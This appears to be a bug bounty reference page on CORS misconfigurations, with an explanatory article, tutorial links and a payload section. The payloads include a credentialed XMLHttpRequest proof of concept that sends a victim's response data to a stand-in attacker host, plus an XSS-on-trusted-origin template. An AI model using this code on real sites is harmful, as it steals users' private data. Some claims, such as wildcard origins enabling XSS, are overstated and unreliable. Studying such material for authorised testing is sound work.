# Cross Origin Resource Sharing

- [Explaination](#introduction)
- [Tutorials](#tutorials-for-cross-origin-resource-sharing)
- [Payloads](#payloads-for-cross-origin-resource-sharing)

# Introduction:
Bug bounty hunting has become a popular practice for identifying and reporting security vulnerabilities in web applications. One common area that bug hunters often encounter is Cross-Origin Resource Sharing (CORS) misconfigurations. In this article, we will delve into the world of CORS and explore its significance in bug bounty hunting.

## Understanding CORS:
Cross-Origin Resource Sharing (CORS) is a mechanism that allows web browsers to make cross-origin requests securely. Browsers impose the same-origin policy, which restricts JavaScript code on a web page from making requests to a different domain. CORS relaxes this restriction by defining a set of HTTP headers that enable controlled access to resources from a different domain.

CORS is crucial for modern web applications that rely on APIs and interact with resources hosted on different domains. However, misconfigurations in CORS policies can lead to severe security vulnerabilities, including data leakage, privilege escalation, and even remote code execution.

### Common CORS Misconfigurations:

Wildcard Origins: One of the most common misconfigurations is the use of wildcard origins in the Access-Control-Allow-Origin header. If the server responds with Access-Control-Allow-Origin: *, it allows requests from any domain, opening the door for attackers to abuse the functionality and launch cross-site scripting (XSS) or cross-site request forgery (CSRF) attacks.

Overly Permissive Headers: Server responses that contain overly permissive headers, such as Access-Control-Allow-Methods and Access-Control-Allow-Headers, can result in dangerous exploitation scenarios. Attackers can abuse these headers to perform unauthorized actions or extract sensitive information.

Origin Reflection: Some servers reflect the value of the Origin header in the Access-Control-Allow-Origin header without proper validation. This can enable attackers to bypass the intended CORS restrictions and make cross-origin requests.

Misconfigured Preflight Requests: CORS relies on preflight requests to determine whether a cross-origin request is safe to execute. Misconfigurations in the preflight response headers, such as incorrect or missing Access-Control-Allow-Origin or Access-Control-Allow-Methods, can lead to bypassing CORS restrictions and exposing the application to potential attacks.

### Bug Bounty Hunting Techniques:

Origin Header Manipulation: As a bug bounty hunter, you can start by manipulating the Origin header and observing the server's response. Try different domains and subdomains to identify potential CORS misconfigurations.

CORS Exploitation: Once you identify a misconfiguration, try to exploit it by making cross-origin requests that should ideally be blocked. Test for potential data leakage, privilege escalation, or unauthorized actions that can be performed due to CORS weaknesses.

Preflight Request Analysis: Analyze the preflight request and response headers to identify any inconsistencies or misconfigurations. Pay attention to the Access-Control-Allow-Origin, Access-Control-Allow-Methods, and Access-Control-Allow-Headers headers.

Authorization Bypass: Exploit CORS misconfigurations in combination with other vulnerabilities to bypass authentication or authorization mechanisms. For example, if the server allows cross-origin requests without proper authentication, it may lead to unauthorized access to sensitive information.

### Reporting and Impact:
When you discover a CORS misconfiguration, it is essential to report it responsibly to the organization or platform running the bug bounty program. Provide a detailed report, including the steps to reproduce the issue, impact assessment, and potential remediation suggestions. The impact of a CORS vulnerability can range from low to critical, depending on the specific context and potential exploitation scenarios.

# Conclusion:
Cross-Origin Resource Sharing (CORS) misconfigurations pose significant security risks to web applications. As a bug bounty hunter, having a solid understanding of CORS and its potential vulnerabilities is crucial. By employing various techniques and exploiting misconfigurations, you can uncover critical security flaws, help organizations enhance their security posture, and contribute to a safer web environment. Happy hunting!

### Tutorials for Cross Origin Resource Sharing
* [What is CORS?](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) - A good tutorial for CORS by Portswigger
* [Cross Origin Resource Sharing](https://www.geeksforgeeks.org/cross-origin-resource-sharing-cors/) - A tutorial on GeeksforGeeks
* [Think Outside the Scope: Advanced CORS Exploitation Techniques](https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397) - A great article on CORS
* [CORS Misconfigurations Explained](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/) - Another great article to read

### Payloads for Cross Origin Resource Sharing

**Vulnerable Implementation**
```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}

```

**Proof of Concept**
```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};

```
alternative

```
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>

```

**Vulnerable Example: XSS on Trusted Origin**

```
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>

```